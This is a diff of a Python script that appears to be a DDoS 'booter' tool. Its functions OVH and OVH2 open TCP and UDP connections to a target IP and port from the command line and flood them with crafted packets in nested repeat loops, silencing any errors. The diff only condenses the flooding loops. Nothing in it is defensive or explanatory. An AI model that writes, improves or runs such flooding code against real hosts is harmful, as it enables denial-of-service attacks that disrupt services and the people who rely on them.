@@ -62,18 +62,11 @@ def OVH_BUILDER():
 def OVH(ip,port,times,booter):
   for _ in range(times):
     try:
-      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-      s2 = socket.create_connection((ip,port))
-      s.connect((ip,port))
-      s.connect_ex((ip,port))
+      s = socket.create_connection((ip,port))
       packet = OVH_BUILDER()
       for a in packet:
         a = a.encode()
-        for _ in range(booter):
-          s.send(a)
-          s.sendall(a)
-          s2.send(a)
-          s2.sendall(a)
+        [s.sendall(a) for _ in range(booter)]
     except:pass
 
 def OVH2(ip,port,times,booter):
@@ -83,8 +76,7 @@ def OVH2(ip,port,times,booter):
       packet = OVH_BUILDER()
       for a in packet:
         a = a.encode()
-        for _ in range(booter):
-          s.sendto(a,(ip,port))
+        [s.sendto(a,(ip,port)) for _ in range(booter)]
     except:pass
   
 ip = sys.argv[1]
